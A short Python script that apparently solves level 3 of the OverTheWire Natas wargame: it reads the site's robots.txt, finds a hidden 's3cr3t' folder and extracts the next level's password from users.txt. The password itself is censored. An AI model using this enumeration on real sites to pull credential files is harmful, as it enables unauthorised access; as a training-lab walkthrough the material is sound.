'''
In this challenge you have to know what you are looking for.
'''
import requests
import re

username = "natas3"
password = "<censored>"
url = "http://%s.natas.labs.overthewire.org/"  % username

response = requests.get(url, auth=(username,password))
print(response.text)
print("="*50)

'''
The source code has the next message:
<!-- No more information leaks!! Not even Google will find it this time... -->
That means that the "robots.txt" file has some information for Google (and for us).
'''

robots = "robots.txt"
response = requests.get(url+robots, auth=(username,password))
print(response.text)
print("="*50)

'''
We found a new secret folder in our page, named "s3cr3t".
Let's get the password from the "users.txt" file inside that folder.
'''
secret_path = "s3cr3t/users.txt"
response = requests.get(url+secret_path,auth=(username,password))
print("\nThe password for the next level is: " + re.findall(r"natas4:(.*)",response.text)[0])
